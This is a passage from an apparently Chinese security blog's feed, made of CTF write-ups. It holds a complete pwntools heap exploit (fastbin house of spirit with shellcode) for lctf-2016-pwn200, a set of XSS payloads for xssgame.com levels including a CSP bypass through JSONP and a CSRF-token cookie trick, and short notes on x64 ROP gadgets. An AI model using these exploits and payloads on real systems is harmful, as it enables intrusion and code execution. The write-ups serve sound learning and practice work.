<span class="built_in">malloc</span>(<span class="number">32</span>);</div><div class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>];</div><div class="line">    read(<span class="number">0</span>, buf, <span class="number">0x80</span>);</div><div class="line"></div><div class="line"></div><div class="line">    <span class="built_in">free</span>(p);</div><div class="line">    <span class="built_in">malloc</span>(<span class="number">32</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>我们要利用第一个read</p>
<ol>
<li>覆盖p变量,指向伪造的堆块</li>
<li><p>伪造一个堆块..格式大概是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">prev_size = <span class="number">0x00</span></div><div class="line">size = <span class="number">0x29</span> <span class="comment">//因为我们伪造的这个堆块大小也是32, 32 + 8 + 1 =&gt; 0x29</span></div><div class="line">fd = <span class="number">0x00</span></div></pre></td></tr></table></figure>
</li>
<li><p>因为free的时候还会对相邻的后一个chunk(是从地址上后一个,因为这个时候还是allocate的,所以和list无关)进行检查所以,要再伪造一个堆块,大小适中就可以了,inuse要是1??</p>
</li>
</ol>
<blockquote>
<p>找打这个下一块应该是,emmmm,本块的size字段地址偏移本字段size的大小, 拿到下一块的大小,下一块的大小适中就可以了emmmmm</p>
</blockquote>
<p>之后free的时候,会把我们伪造堆块Free掉就会挂进到fastbinlistY里</p>
<p>最后再malloc的时候就能获取到我们的伪造堆块了</p>
<p>综上我们要有两个可控区域,如果在栈上的话<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">+------------------+ 低地址</div><div class="line">chunk 1</div><div class="line">+------------------+</div><div class="line">想要控制的地址</div><div class="line">+------------------+</div><div class="line">chunk2</div><div class="line">+------------------+ 高地址</div></pre></td></tr></table></figure></p>
<p>在栈上的话,肯定是先有了chunk2,然后有了chunk1,这个低地址的chunk1要能达到覆盖某个 <code>p = malloc(some_size)</code>的p的目的,然后这个chunk2用来绕过检查</p>
<h2 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h2><p>lctf-2016-pwn200</p>
<p>这个题目按照我这边布置的结构大概是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">+--------------------+</div><div class="line">[8H]    RBP -------------&gt; 0x7fff ffff d9c0 (leak_addr)</div><div class="line">+--------------------+ --&gt; 0x7fff ffff d9a0</div><div class="line">[30H]  shellcode</div><div class="line">+--------------------+ -+&gt; 0x7fff ffff d970 (leak_addr - 50H) [*]shellcode_addr</div><div class="line">[20H]                   +</div><div class="line">+--------------------+ -+&gt; 0x7fff ffff d950</div><div class="line">[8H] ***ret_addr***     +</div><div class="line">+--------------------+  + =====&gt; 40H的User Data</div><div class="line">[8H] RBP                +</div><div class="line">+--------------------+  +</div><div class="line">[10H]                   +</div><div class="line">+--------------------+ -+&gt; 0x7fff ffff d830 (leak_addr - 90H) [*]fake_addr (User_data)</div><div class="line">[8H] size = 0x41</div><div class="line">+--------------------+</div><div class="line">[8H] prev_size</div><div class="line">+--------------------+</div><div class="line">[20H] padding</div><div class="line">+--------------------+</div></pre></td></tr></table></figure></p>
<p>因为<code>print(&quot;%s&quot;)</code> 是遇到<code>\x00</code>得时候才认为字符串结束,所以我们如果输入给正好30H的数据(不含有<code>\x00</code>)的话,那那就泄露出上面最上面<code>EBP</code>的值<br>因为EBP大概是<code>0x0000 7fff ffff xxxx</code> 这样子的结构,所以从低到高会泄露出6个字节</p>
<p>调试一下发现泄露出来的的EBP的值(leak_addr)和我们这个时候的EBP差20H…,<br>因为题目基本没有开任何防护,所以这里顺便铺设了shellcode,然后缓冲区是30H的大小<br>所以我们生成一个payload,然后高字节用padding够30H,发给题目<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">payload  = <span class="string">''</span></div><div class="line">payload += shellcode.ljust(<span class="number">48</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'who are u?\n'</span>)</div><div class="line">p.send(payload)</div><div class="line">p.recvuntil(payload)</div><div class="line"></div><div class="line">leak_addr = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div></pre></td></tr></table></figure></p>
<p>这个时候观察一下我们的shellcode距离当前RBP有30H, 当前RBP距离leak_addr有20H偏移<br>所以<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">shellcode_addr = leak_addr - <span class="number">50</span>H</div></pre></td></tr></table></figure></p>
<p>后面有个功能输入id,可以伪造成第二个堆块的大小,这个id变量是放在leak_addr - 58H的地方,就是放在和我们shellcode相邻并且地址更小的那个地方,这个大小只要适当就好了,具体是在什么什么和什么什么之间来着忘记了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id = getid()</div></pre></td></tr></table></figure></p>
<p>下一步是输入money,就是我们的核心,这里有一个溢出,我们要把malloc到的一个指针p覆盖成我们的fake_addr,然后还顺便构造好我们的fake_chunk的size,我们这里构造0x41,在之后我们会通过free把他拉进list里,最后malloc出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">+-----------+</div><div class="line">shellcode</div><div class="line">+-----------+ --+</div><div class="line">id (size)       +</div><div class="line">+-----------+   +</div><div class="line">padding         +</div><div class="line">+-----------+   +===&gt; fake_chunk&apos;s Size = 0x40</div><div class="line">RIP             +</div><div class="line">+-----------+   +</div><div class="line">RBP             +</div><div class="line">+-----------+   +</div><div class="line">padding         +</div><div class="line">+-----------+ --+--&gt; fake_addr</div><div class="line">size (0x41)</div><div class="line">+-----------+   </div><div class="line">prev_size</div><div class="line">+-----------+</div></pre></td></tr></table></figure></p>
<p>大概就是这样子,<code>+</code>扩住的是我们最后要控制的地区,<code>fake_addr + 0x40 - 0x08</code>这个地址也就是id所在的地址被认为是下一块chunk,我们通过输入id,构造好了这里</p>
<p>等我们控制了这里之后,在写fake_chunk时候送一个<code>padding + shellcode_addr</code>,就能控制图中的RIP,达到了目的</p>
<p>最后poc<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">7777</span>)</div><div class="line"><span class="comment"># p = process('./pwn200')</span></div><div class="line"></div><div class="line">free_got = <span class="number">0x0000000000602018</span></div><div class="line"></div><div class="line">shellcode = asm(shellcraft.amd64.linux.sh(), arch = <span class="string">'amd64'</span>)</div><div class="line"></div><div class="line">payload  = <span class="string">''</span></div><div class="line">payload += shellcode.ljust(<span class="number">48</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'who are u?\n'</span>)</div><div class="line">p.send(payload)</div><div class="line">p.recvuntil(payload)</div><div class="line"></div><div class="line">rbp_addr = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line"></div><div class="line">shellcode_addr = rbp_addr - <span class="number">0x50</span> <span class="comment"># 20H + 30H</span></div><div class="line"><span class="keyword">print</span> hex(shellcode_addr)</div><div class="line">fake_addr = rbp_addr - <span class="number">0x90</span> <span class="comment"># offset 0x40 to shellcode</span></div><div class="line"></div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'give me your id ~~?\n'</span>)</div><div class="line">p.sendline(<span class="string">'32'</span>) <span class="comment"># id</span></div><div class="line">p.recvuntil(<span class="string">'give me money~\n'</span>)</div><div class="line"></div><div class="line"><span class="comment"># 32bytes padding + prev_size + size + padding + fake_addr</span></div><div class="line">data = p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>)</div><div class="line">data = data.ljust(<span class="number">56</span>, <span class="string">'\x00'</span>) + p64(fake_addr)</div><div class="line"><span class="keyword">print</span> data</div><div class="line">p.send(data)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'choice : '</span>)</div><div class="line">p.sendline(<span class="string">'2'</span>) <span class="comment"># free(fake_addr)</span></div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'choice : '</span>)</div><div class="line">p.sendline(<span class="string">'1'</span>) <span class="comment">#malloc(fake_addr) #fake_addr</span></div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'long?'</span>)</div><div class="line">p.sendline(<span class="string">'48'</span>)    <span class="comment"># 48 + 16 = 64 = 0x40</span></div><div class="line">p.recvline(<span class="string">'48'</span>)    <span class="comment"># ptr = malloc(48) </span></div><div class="line"></div><div class="line">data = <span class="string">'a'</span> * <span class="number">0x18</span> + p64(shellcode_addr) <span class="comment"># write to target_addr</span></div><div class="line">data = data.ljust(<span class="number">48</span>, <span class="string">'\x00'</span>)</div><div class="line"></div><div class="line">p.send(data)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'choice'</span>)</div><div class="line">p.sendline(<span class="string">'3'</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[xssgame]]></title>
      <url>/2017/07/26/xssgame-1/</url>
      <content type="html"><![CDATA[<p>发现了这个,mark一下<br><a href="http://www.xssgame.com/" target="_blank" rel="external">http://www.xssgame.com/</a></p>
<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.xssgame.com/f/m4KKGHi2rVUN/?query=&lt;script&gt;alert(/1/)&lt;/script&gt;</div></pre></td></tr></table></figure>
<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>dom xss 点在这里,大概代码是这样子的<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">"loading"</span> <span class="attr">src</span>=<span class="string">"/static/img/loading.gif"</span> <span class="attr">style</span>=<span class="string">"width: 50%"</span> <span class="attr">onload</span>=<span class="string">"startTimer('$_GET["</span><span class="attr">timer</span>"]')</span></div></pre></td></tr></table></figure></p>
<p>所以认为构造<code>?timer=1&#39;);alert(&#39;1</code>就可以了结果发现不可以,不过为什么不可以呢<br>随后试了<code>%0a</code>和<code>%0d</code>都可以,所以最后payload是<br><code>http://www.xssgame.com/f/WrfpuKFX8GNr/?timer=1&#39;)%0aalert(&#39;1</code><br>或者<br><code>http://www.xssgame.com/f/WrfpuKFX8GNr/?timer=1&#39;)%0dalert(&#39;1</code></p>
<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>这个name是hash<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> html = <span class="string">"Cat "</span> + <span class="built_in">parseInt</span>(name) + <span class="string">"&lt;br&gt;"</span>;</div><div class="line">html += <span class="string">"&lt;img src='/static/img/cat"</span> + name + <span class="string">".jpg' /&gt;"</span>;</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.xssgame.com/f/u0hrDTsXmyVJ/#33.jpg&apos;%20onerror=alert(/1/)%20k=&apos;`</div></pre></td></tr></table></figure>
<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>走着走着,发现comfirm这里有个window.location,应该是这样子??<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="built_in">window</span>.location = <span class="string">'$_GET["next"]'</span>; &#125;, <span class="number">1000</span>);</div></pre></td></tr></table></figure></p>
<p><code>http://www.xssgame.com/f/__58a1wgqGgI/confirm?next=javascript:alert(/1/)</code></p>
<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>angular的,看不太懂,感觉我的输入被插到了一个不能解析的地方…悲剧啊,也闭合不了标签,和丢到pre里了感觉差不多,但我的看起来是在<code>&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;b&gt;</code>里的诶<br>感觉这个输出点不能用,再找找其他的</p>
<p>后来又看到了一个地方,这个应该是<code>UTM_PARAMS</code>数组里的这些,只要能被<code>getElementsByName</code>,也就是有name的都能被利用的感觉</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> UTM_PARAMS = [<span class="string">"utm_content"</span>, <span class="string">"utm_medium"</span>, <span class="string">"utm_source"</span>,</div><div class="line">  <span class="string">"utm_campaign"</span>, <span class="string">"utm_term"</span>]</div><div class="line"></div><div class="line"><span class="keyword">if</span> (location.search)</div><div class="line">&#123;</div><div class="line"><span class="keyword">var</span> params = location.search.substring(<span class="number">1</span>).split(<span class="string">'&amp;'</span>);</div><div class="line"></div><div class="line"><span class="keyword">for</span> (<span class="keyword">var</span> p <span class="keyword">in</span> params) &#123;</div><div class="line">  <span class="keyword">var</span> r = params[p].split(<span class="string">'='</span>);</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (r.length == <span class="number">2</span> &amp;&amp; UTM_PARAMS.indexOf(r[<span class="number">0</span>]) != <span class="number">-1</span>) &#123;</div><div class="line">    <span class="keyword">var</span> el = <span class="built_in">document</span>.getElementsByName(r[<span class="number">0</span>]);  <span class="comment">// *****</span></div><div class="line">    <span class="keyword">if</span> (el.length) el[<span class="number">0</span>].value = <span class="built_in">decodeURIComponent</span>(r[<span class="number">1</span>]); <span class="comment">// ****</span></div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>大概是就是你输入的查询参数键值对会<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">document.getElementsByName(key).value = decodeURIComponent(value);</div></pre></td></tr></table></figure></p>
<p>那我们看看<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"demo2-query"</span> <span class="attr">name</span>=<span class="string">"query"</span> <span class="attr">maxlength</span>=<span class="string">"140"</span> <span class="attr">ng-model</span>=<span class="string">"query"</span> <span class="attr">placeholder</span>=<span class="string">"Enter query here..."</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"utm_term"</span> <span class="attr">type</span>=<span class="string">"hidden"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"utm_campaign"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"cpc"</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>交了一个<code>?utm_term=ssssss&quot;&gt;</code>,发现引号被搞成<code>&amp;quot;</code>了</p>
<p>感觉angular肯定是这个能在引号里使用表达式,能不能直接在<code>value=&quot;&quot;</code>里使用什么技能调用<code>alert</code>…</p>
<p>稍微学习了一下<br>果然有个<code>$eval</code>,配合我们这里的<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">angular.module(<span class="string">'myApp'</span>, [])</div><div class="line">.controller(<span class="string">'myController'</span>, [<span class="string">'$scope'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$scope</span>) </span>&#123;</div><div class="line">    $scope.query = <span class="string">""</span>;</div><div class="line">    $scope.alert = <span class="built_in">window</span>.alert;</div><div class="line">&#125;]);</div></pre></td></tr></table></figure></p>
<p>可以提交<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?utm_term=&#123;&#123;$eval(alert(1))&#125;&#125;</div></pre></td></tr></table></figure></p>
<p>就可以了, 这里的<code>alert</code>是<code>$scope.alert</code><br>最后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.xssgame.com/f/JFTG_t7t3N-P/?utm_campaign=&#123;&#123;$eval(alert(1))&#125;&#125;</div></pre></td></tr></table></figure></p>
<blockquote>
<p>由于blog后边是handlebars渲染…所以这里的花括号alert秘制报错..只能放到<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">## level 6</div><div class="line">这次是服务器端模板渲染</div><div class="line">有个东西叫SSTI,服务器端模板注入</div><div class="line"></div><div class="line">## level7</div><div class="line">这题是bypass csp</div><div class="line">看了下题目中就有个jsonp...</div><div class="line">```javascript</div><div class="line">/**</div><div class="line"> * Ask server side what to display.</div><div class="line"> */</div><div class="line">function main() &#123;</div><div class="line">    var m = location.search.match(&apos;menu=(.*)&apos;);</div><div class="line">    var menu = m ? atob(m[1]) : &apos;about&apos;;</div><div class="line">    document.write(&apos;&lt;script src=&quot;jsonp?menu=&apos; + encodeURIComponent(menu) + &apos;&quot;&gt;&lt;/script&gt;&apos;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">/**</div><div class="line"> * Display stuff returned from server side.</div><div class="line"> * @param &#123;string&#125; data - JSON data from server side</div><div class="line"> */</div><div class="line">function callback(data) &#123;</div><div class="line">    if (data.title) document.write(&apos;&lt;h1&gt;&apos; + data.title + &apos;&lt;/h1&gt;&apos;);</div><div class="line">    if (data.pictures) data.pictures.forEach(function(url) &#123;</div><div class="line">        document.write(&apos;&lt;img src=&quot;/static/img/&apos; + url + &apos;&quot;&gt;&lt;br&gt;&lt;br&gt;&apos;);</div><div class="line">    &#125;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">main();</div></pre></td></tr></table></figure></p>
</blockquote>
<p>我们请求一下这个jsonp<br><code>http://www.xssgame.com/f/wmOM2q5NJnZS/jsonp?menu=&lt;script&gt;alert(1)&lt;/script&gt;</code><br>会发现返回<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">callback(&#123;<span class="string">"title"</span>:<span class="string">"Error, no such menu: &lt;script&gt;alert(123)&lt;/script&gt;"</span>&#125;)</div></pre></td></tr></table></figure></p>
<p>这个title会被原样填到h1里面,这个时候,就….<br>醒醒,这里有csp…没有unsafe-inline的话这样子写到页面里会被kill掉</p>
<p>这里要利用jsonp来bypass csp,jsonp的服务器端大约是这样子<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>  </div><div class="line">$callback = <span class="string">'callback'</span>;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'callback'</span>]) &amp;&amp; $_GET[<span class="string">'callback'</span>]) &#123;</div><div class="line">    $callback = $_GET[<span class="string">'callback'</span>];</div><div class="line">&#125;</div><div class="line"><span class="comment">// 其实是还要找一下menu提交的图片是不是找得到,这个省略了</span></div><div class="line">$arr=<span class="keyword">array</span>(<span class="string">'title'</span>=&gt;<span class="string">'xxx'</span>,<span class="string">'pictures'</span>=&gt;<span class="string">'xxx'</span>);  </div><div class="line">$result=json_encode($arr);  </div><div class="line"><span class="keyword">echo</span> $callback.<span class="string">"($result)"</span>;  </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>所以我们提交menu=<code>&lt;script src=&quot;jsonp?callback=alert(1);//&quot;&gt;&lt;/script&gt;</code>的base64值就可以了</p>
<p>最后<br><code>http://www.xssgame.com/f/wmOM2q5NJnZS/?menu=PHNjcmlwdCBzcmM9Impzb25wP2NhbGxiYWNrPWFsZXJ0KDEpOy8vIj48L3NjcmlwdD4=</code></p>
<h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>上来设置个用户名,发现走的是这个链接<br><code>http://www.xssgame.com/f/d9u16LTxchEi/set?name=name&amp;value=wwww&amp;redirect=index</code><br>看起来是设置键值对的.这里设置的是name,那应该其他的值也能设置??<br>然后下面还有个功能是设置amount,我们随便设置一个aaa<br>发现会告诉你不是数字.并且会回显,那xss点应该就在这个地方了<br>我们交个<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<blockquote>
<p>Sorry, but this URL is specific to your random CSRF token, which means that the solution wouldn’t work in an other browser, so not counting this as a valid solution. Try harder.</p>
</blockquote>
<p>然后看看我们的链接是<br><code>http://www.xssgame.com/f/d9u16LTxchEi/transfer?name=sss&amp;amount=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;csrf_token=Q63O6XH1QY</code></p>
<p>不难发现这个token是存在cookie里的</p>
<p>所以我想,这样子就可以了,一边在set这里设置csrf_token的值,一边在redirect到transfer填上它<br><code>http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&amp;value=456&amp;redirect=transfer?csrf_token=456&amp;amount=%3Cscript%3Ealert%281%29%3C%2Fscript%3E</code><br>然后…没报错回显<br>在chrome里看一下,是这个transfer时候只是redirect到了<code>transfer?csrf_token=456</code>,忘了把<code>redirect=transfer?csrf_token=456&amp;amount=&lt;script&gt;alert(1)&lt;/script&gt;</code>要escape一下,是<code>redirect=transfer%3Fcsrf_token%3D456%26amount%3D%3Cscript%3Ealert%281%29%3C%2fscript%3E</code></p>
<p>最后<br><code>http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&amp;value=456&amp;redirect=transfer%3Fcsrf_token%3D456%26amount%3D%3Cscript%3Ealert%281%29%3C%2fscript%3E</code></p>
<p>结束</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[fast bin漏洞利用]]></title>
      <url>/2017/07/25/fast-bin%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
      <content type="html"><![CDATA[<p><a href="http://www.vuln.cn/6653" target="_blank" rel="external">http://www.vuln.cn/6653</a><br><a href="http://www.vuln.cn/6654" target="_blank" rel="external">http://www.vuln.cn/6654</a><br><a href="http://www.cnblogs.com/Ox9A82/p/5865420.html" target="_blank" rel="external">http://www.cnblogs.com/Ox9A82/p/5865420.html</a></p>
<p>顺便mark下,明天看完<br><a href="http://bobao.360.cn/ctf/detail/189.html" target="_blank" rel="external">http://bobao.360.cn/ctf/detail/189.html</a><br><a href="http://bobao.360.cn/learning/detail/3694.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3694.html</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[一些点滴关于pwn]]></title>
      <url>/2017/07/25/%E4%B8%80%E4%BA%9B%E7%82%B9%E6%BB%B4%E5%85%B3%E4%BA%8Epwn/</url>
      <content type="html"><![CDATA[<h2 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h2><p>ELF魔数 <code>7f 45 4c 46</code>就是<code>\7fELF</code></p>
<h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p>如果没有开PIE:<br>x86 是 0x8048000<br>x64 是 0x400000</p>
<h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>x86栈地址开始于 0xFFFF FFFF<br>x64栈地址开始于 0x0000 7FFF FFFF FFFF</p>
<p>栈地址开始的地方也应该是可使用的最大地址吧</p>
<h2 id="x64传参"><a href="#x64传参" class="headerlink" title="x64传参"></a>x64传参</h2><p>RDI, RSI, RDX, RCX, R8和 R9</p>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">p = process(<span class="string">'./pwn100'</span>)</div><div class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]</div><div class="line">gdb.attach(p)</div></pre></td></tr></table></figure>
<h2 id="x64-通用gadgets"><a href="#x64-通用gadgets" class="headerlink" title="x64 通用gadgets"></a>x64 通用gadgets</h2><p>蒸米的文章中提到的libc里会存在<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">pop rbx</div><div class="line">pop rbp</div><div class="line">pop r12</div><div class="line">pop r13</div><div class="line">pop r14</div><div class="line">pop r15</div><div class="line">ret</div></pre></td></tr></table></figure></p>
<p>这样子的gadgets, 我们编译一个x64的程序<code>objdump -M intel -d</code>观察一下<br>这个参数是用intel的,默认的ATT看着好不习惯<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">*  4007a0:	4c 89 ea             	mov    rdx,r13</div><div class="line">*  4007a3:	4c 89 f6             	mov    rsi,r14</div><div class="line">*  4007a6:	44 89 ff             	mov    edi,r15d</div><div class="line">*  4007a9:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]</div><div class="line">  4007ad:	48 83 c3 01          	add    rbx,0x1</div><div class="line">  4007b1:	48 39 eb             	cmp    rbx,rbp</div><div class="line">  4007b4:	75 ea                	jne    4007a0 &lt;__libc_csu_init+0x40&gt;</div><div class="line">*  4007b6:	48 83 c4 08          	add    rsp,0x8</div><div class="line">*  4007ba:	5b                   	pop    rbx</div><div class="line">*  4007bb:	5d                   	pop    rbp</div><div class="line">*  4007bc:	41 5c                	pop    r12</div><div class="line">*  4007be:	41 5d                	pop    r13</div><div class="line">*  4007c0:	41 5e                	pop    r14</div><div class="line">*  4007c2:	41 5f                	pop    r15</div><div class="line">*  4007c4:	c3                   	ret</div></pre></td></tr></table></figure></p>
<p>这里其实有两个有用的gadgets</p>
<p>另外最后这里的<code>pop r15; ret</code> 对应字节为<code>0x41 0x5f 0xc3</code>,只取后两个字节就是<code>0x5f 0xc3</code>对应其实就是<code>pop rdi; ret</code></p>
